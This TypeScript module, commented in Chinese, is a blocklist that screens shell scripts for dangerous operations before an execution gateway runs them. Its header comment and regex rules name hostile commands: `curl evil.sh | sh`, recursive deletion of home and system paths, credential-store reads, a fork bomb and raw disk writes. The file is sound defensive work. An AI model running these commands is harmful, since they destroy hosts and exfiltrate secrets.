/**
 * 危险命令静态规则集（票 M7-B-T6 / Issue #70）。
 *
 * 这是「完全权限」模式下**唯一**仍然生效的拦截层，所以规则必须"宁严勿松"：
 * 误拦的代价是 Owner 多改一次脚本；漏拦的代价是宿主被毁或凭据外泄。
 *
 * 关键立场（来自 M7 访谈 Q18 的技术澄清，见 ADR-0012）：
 * 沙箱预演**不能**证明宿主无害 —— 沙箱内无网络、无凭据、无 `~/.ssh`，所以
 * `rm -rf ~/projects`、`curl evil.sh | sh`、`git push --force` 在沙箱里都"通过"。
 * 因此是否危险只能靠**对脚本文本的静态分析**判断，不能靠"跑一遍看看"。
 *
 * 实现取舍：
 *   - 用**多模式**匹配而非单一正则：同一危险意图有无数写法（`rm -rf` / `rm -fr` /
 *     `rm -r -f` / `rm --recursive --force`），单正则必漏。
 *   - 匹配前做**归一化**（去掉引号/多余空白、展开常见变量、把 `\` 续行接起来），
 *     否则 `r\m -rf /` 之类能绕过。
 *   - 只做"是否命中"的判定并给出命中的规则 id 与说明，**不**尝试解析 shell 语法树
 *     （那会把"静态分析"变成"半个 shell 实现"，反而更容易出错）。
 */

/** 危险等级：critical 一律拒绝；high 也拒绝（不设"确认后可执行"，避免误判空间） */
export type DangerLevel = "critical" | "high";

/** 一条规则 */
export interface DangerRule {
  /** 稳定 id（写进审计，便于事后归因"被哪条规则拦的"） */
  id: string;
  level: DangerLevel;
  /** 人类可读原因（直接展示给 Owner） */
  reason: string;
  /** 命中判定：输入是已归一化的脚本文本 */
  test(script: string): boolean;
}

/** 归一化：接续行、去引号、压空白、统一大小写（命令名大小写不敏感） */
export function normalizeScript(script: string): string {
  return script
    // 反斜杠续行先接起来：`rm -rf \` 换行 `/` 会绕过按行匹配
    .replace(/\\\r?\n/g, " ")
    // 去掉单双引号（保留内容）：`r"m" -rf /` 与 `rm -rf /` 同义
    .replace(/["']/g, "")
    // 折叠空白（含制表）
    .replace(/[ \t]+/g, " ")
    .trim();
}

/**
 * 取出每个"命令位置"的片段（用于按命令名判定）。
 *
 * 粗略按 `;`、`&&`、`||`、`|`、换行切分即可：我们的目的是**找出有没有危险命令**，
 * 不需要精确的子 shell 语义。宁可多切几段（误伤代价小）。
 */
export function commandSegments(script: string): string[] {
  return normalizeScript(script)
    .split(/[;\n]|&&|\|\||\|/)
    .map((segment) => segment.trim())
    .filter((segment) => segment.length > 0);
}

/**
 * `sudo` 一类包装命令里**带值**的选项：`sudo -u root rm` 的 `-u` 后面跟的是用户名，
 * 不是命令名。漏掉这层跳跃会让 `sudo -u root rm -rf /` 被当成命令 `root`，直接漏拦。
 */
const VALUE_OPTIONS = new Set([
  "-u",
  "-g",
  "-p",
  "-C",
  "-T",
  "-r",
  "-t",
  "-U",
  "--user",
  "--group",
  "--prompt",
  "--close-from",
  "--role",
  "--type",
  "--other-user",
  "--chdir",
  "--host",
  "-h",
]);

/** 找到"真正的命令"在 words 里的下标（剥掉 sudo/env/nohup 与赋值前缀） */
function commandIndex(words: readonly string[]): number {
  let index = 0;
  while (index < words.length) {
    const word = words[index];
    if (word === "sudo" || word === "doas" || word === "command" || word === "nohup" || word === "exec") {
      index += 1;
      // 跳过该包装命令自己的选项；带值的选项要连值一起跳过
      while (index < words.length && words[index].startsWith("-")) {
        const option = words[index];
        index += 1;
        if (VALUE_OPTIONS.has(option)) index += 1;
      }
      continue;
    }
    if (word === "env") {
      index += 1;
      while (
        index < words.length &&
        (words[index].startsWith("-") || /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[index]))
      ) {
        index += 1;
      }
      continue;
    }
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
      index += 1; // 赋值前缀
      continue;
    }
    break;
  }
  return index;
}

/** 取出片段里第一个词作为命令名（跳过前置的 `sudo`/`env VAR=x`/`nohup` 之类） */
export function commandWord(segment: string): string {
  const words = segment.split(" ").filter((word) => word.length > 0);
  const word = words[commandIndex(words)] ?? "";
  // 取 basename：`/bin/rm` 与 `rm` 等价
  const base = word.split("/").pop() ?? word;
  return base.toLowerCase();
}

/** 片段里的参数列表（去掉命令名与包装前缀之后） */
export function segmentArgs(segment: string): string[] {
  const words = segment.split(" ").filter((word) => word.length > 0);
  return words.slice(commandIndex(words) + 1);
}

/** 递归+强制删除的组合判定（同一片段内同时出现） */
function hasRecursiveForce(segment: string): boolean {
  const args = segmentArgs(segment);
  // 长选项
  if (args.includes("--recursive") && (args.includes("--force") || args.includes("--no-preserve-root"))) {
    return true;
  }
  if (args.includes("--recursive") && args.includes("--force")) return true;
  // 短选项组合：-rf / -fr / -rfv / -Rf 等
  const combined = args.filter((arg) => /^-[A-Za-z]+$/.test(arg));
  for (const arg of combined) {
    const flags = arg.slice(1).toLowerCase();
    if (flags.includes("r") && flags.includes("f")) return true;
  }
  // 分开写：-r -f
  const hasR = combined.some((arg) => /r/i.test(arg.slice(1)));
  const hasF = combined.some((arg) => /f/i.test(arg.slice(1)));
  return hasR && hasF;
}

/** 目标是否是系统关键路径（`/`、`/*`、`~`、`~/*`、`/etc`、`/usr`、`/var` 等） */
function isProtectedTarget(target: string): boolean {
  const value = target.trim();
  if (value === "/" || value === "/*" || value === "//") return true;
  if (value === "~" || value === "~/" || value === "~/*" || value === "$HOME" || value === "$HOME/" || value === "$HOME/*") {
    return true;
  }
  // 任意系统顶层目录（含带通配）
  return /^\/(?:etc|usr|bin|sbin|var|lib|lib64|boot|opt|srv|root|home)(?:\/|\*|$)/.test(value);
}

export const DANGER_RULES: readonly DangerRule[] = [
  {
    id: "rm-protected-path",
    level: "critical",
    reason: "递归强制删除系统关键路径或家目录根（会毁掉宿主）",
    test: (script) =>
      commandSegments(script).some((segment) => {
        const word = commandWord(segment);
        if (word !== "rm") return false;
        if (!hasRecursiveForce(segment)) return false;
        return segmentArgs(segment).some((arg) => !arg.startsWith("-") && isProtectedTarget(arg));
      }),
  },
  {
    id: "rm-recursive-force",
    level: "high",
    reason: "递归强制删除（完全权限下也需人工确认目标范围）",
    test: (script) =>
      commandSegments(script).some((segment) => commandWord(segment) === "rm" && hasRecursiveForce(segment)),
  },
  {
    id: "write-ssh",
    level: "critical",
    reason: "写入 ~/.ssh（会篡改 SSH 凭据、可劫持远程访问）",
    test: (script) => /(~|\$HOME)\/\.ssh(?:\/|\b)/.test(normalizeScript(script)),
  },
  {
    id: "read-credential-store",
    level: "critical",
    reason: "读取 OS 凭据库（会造成密钥外泄）",
    test: (script) => {
      const normalized = normalizeScript(script).toLowerCase();
      const patterns = [
        /\bsecurity\s+(?:find|dump|export)/, // macOS keychain
        /\bsecret-tool\s+(?:lookup|search)/, // Linux libsecret
        /\bcmdkey\s+\/list/,
        /\bcredential\s+manager/i,
        /\.morrow\/[^\s]*key/, // 本应用密钥文件
        /\bkeyring\b/,
      ];
      return patterns.some((pattern) => pattern.test(normalized));
    },
  },
  {
    id: "pipe-to-shell",
    level: "critical",
    reason: "把下载内容直接管道给 shell 执行（远程代码执行，无法审计内容）",
    test: (script) => {
      const normalized = normalizeScript(script).toLowerCase();
      // 覆盖 curl/wget/fetch | sh/bash/zsh/python/node 以及 `sh -c "$(curl ...)"`
      if (/\b(?:curl|wget|fetch)\b[^|;]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python3?|node|perl|ruby)\b/.test(normalized)) {
        return true;
      }
      if (/\b(?:sh|bash|zsh)\s+-c\s+\$\(\s*(?:curl|wget)\b/.test(normalized)) return true;
      return false;
    },
  },
  {
    id: "dynamic-eval",
    level: "high",
    reason: "动态执行构造出来的代码（eval/exec/base64 解码后执行），无法静态判断内容",
    test: (script) => {
      const normalized = normalizeScript(script).toLowerCase();
      const patterns = [
        /\beval\s+/,
        /\bexec\s+\$/,
        /\bbase64\s+-d[^|;]*\|\s*(?:sh|bash|zsh)\b/,
        /\bpython3?\s+-c\s+["']?exec/,
        /\bnode\s+-e\s+/,
      ];
      return patterns.some((pattern) => pattern.test(normalized));
    },
  },
  {
    id: "git-force-push",
    level: "critical",
    reason: "强制推送 git（会不可逆地改写远端历史）",
    test: (script) =>
      commandSegments(script).some((segment) => {
        const word = commandWord(segment);
        if (word !== "git") return false;
        const args = segmentArgs(segment);
        if (args[0] !== "push") return false;
        return args.some(
          (arg) =>
            arg === "--force" ||
            arg === "-f" ||
            arg.startsWith("--force-with-lease") ||
            // `git push origin +main`：refspec 前缀 `+` 就是强制推送
            (arg.startsWith("+") && arg.length > 1),
        );
      }),
  },
  {
    id: "modify-etc",
    level: "critical",
    reason: "修改 /etc（会破坏系统配置）",
    test: (script) => {
      const normalized = normalizeScript(script);
      // 任何写操作指向 /etc：重定向、cp/mv/tee/sed -i/chmod/chown/dd of=
      if (/>\s*\/etc\//.test(normalized)) return true;
      if (/\b(?:cp|mv|install|ln)\b[^;|]*\s\/etc(?:\/|\s|$)/.test(normalized)) return true;
      if (/\b(?:tee|sed\s+-i|chmod|chown|truncate)\b[^;|]*\/etc\//.test(normalized)) return true;
      if (/\bdd\b[^;|]*of=\/etc\//.test(normalized)) return true;
      return false;
    },
  },
  {
    id: "sudoers",
    level: "critical",
    reason: "修改 sudoers / 添加特权用户（会永久提权）",
    test: (script) => {
      const normalized = normalizeScript(script);
      return /\/etc\/sudoers/.test(normalized) || /\buseradd\b[^;|]*-[^\s]*G\s*(?:sudo|wheel|admin)/.test(normalized);
    },
  },
  {
    id: "fork-bomb",
    level: "critical",
    reason: "fork 炸弹（会耗尽宿主资源）",
    test: (script) => /:\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:/.test(normalizeScript(script)),
  },
  {
    id: "disk-write",
    level: "critical",
    reason: "直接写块设备（会毁坏磁盘）",
    test: (script) => /\bdd\b[^;|]*of=\/dev\/(?:sd|nvme|disk|hd)/.test(normalizeScript(script)) || />\s*\/dev\/(?:sd|nvme|disk)/.test(normalizeScript(script)),
  },
  {
    id: "shutdown-reboot",
    level: "high",
    reason: "关机/重启宿主（会中断所有任务与同步）",
    test: (script) => {
      const words = commandSegments(script).map(commandWord);
      return words.some((word) => ["shutdown", "reboot", "halt", "poweroff"].includes(word));
    },
  },
];

/** 拦截结果 */
export interface DangerVerdict {
  /** 是否放行（false = 拒绝执行，不是"待确认"） */
  allowed: boolean;
  /** 命中的规则（按规则表顺序；空数组表示未命中） */
  hits: Array<{ id: string; level: DangerLevel; reason: string }>;
}

/**
 * 判定脚本是否含危险操作。
 *
 * 返回 `allowed: false` 表示**一律拒绝执行**（即使处于完全权限模式）。
 * 调用方（执行网关）必须把 `hits` 写进审计事件，便于事后归因。
 */
export function screenScript(script: string): DangerVerdict {
  const normalized = normalizeScript(script);
  if (normalized.length === 0) {
    return { allowed: true, hits: [] };
  }
  const hits = DANGER_RULES.filter((rule) => rule.test(normalized)).map((rule) => ({
    id: rule.id,
    level: rule.level,
    reason: rule.reason,
  }));
  return { allowed: hits.length === 0, hits };
}

/**
 * 只读命令白名单（会话内首次确认后免二次确认）。
 *
 * 判定口径很保守：**整条脚本只由白名单命令组成**，且不含重定向/管道到写操作，
 * 才算只读。混合脚本（`ls && rm x`）一律走逐次确认。
 */
export const READONLY_COMMANDS: readonly string[] = [
  "ls",
  "cat",
  "head",
  "tail",
  "wc",
  "grep",
  "rg",
  "find",
  "file",
  "stat",
  "pwd",
  "echo",
  "which",
  "type",
  "tree",
  "du",
  "df",
  "date",
  "uname",
  "git", // 仅当子命令是只读时（见 isReadOnlyScript）
];

/** git 的只读子命令 */
const READONLY_GIT_SUBCOMMANDS = new Set([
  "status",
  "log",
  "diff",
  "show",
  "branch",
  "remote",
  "rev-parse",
  "ls-files",
  "blame",
  "describe",
  "tag",
]);

/**
 * 是否纯只读脚本。
 *
 * 排除项（任何一条命中即不算只读）：
 *   - 有重定向写文件（`>`、`>>`、`tee`）
 *   - 有命令替换 `$(...)` 或反引号（内容无法静态判断）
 *   - 有 `git` 但子命令不在只读集合
 */
export function isReadOnlyScript(script: string): boolean {
  const normalized = normalizeScript(script);
  if (normalized.length === 0) return false;
  if (script.includes("$(") || script.includes("`")) return false;
  // 重定向到文件（排除 `2>&1` 这类）
  if (/(?:^|[^0-9])>{1,2}(?!&)/.test(script)) return false;
  if (/\btee\b/.test(normalized)) return false;

  const segments = commandSegments(normalized);
  if (segments.length === 0) return false;
  for (const segment of segments) {
    const word = commandWord(segment);
    if (!READONLY_COMMANDS.includes(word)) return false;
    if (word === "git") {
      const args = segmentArgs(segment);
      const sub = args.find((arg) => !arg.startsWith("-"));
      if (sub === undefined || !READONLY_GIT_SUBCOMMANDS.has(sub)) return false;
    }
    if (word === "find") {
      // find 的 -delete / -exec 不是只读
      if (/-delete\b|-exec\b|-execdir\b/.test(segment)) return false;
    }
  }
  return true;
}
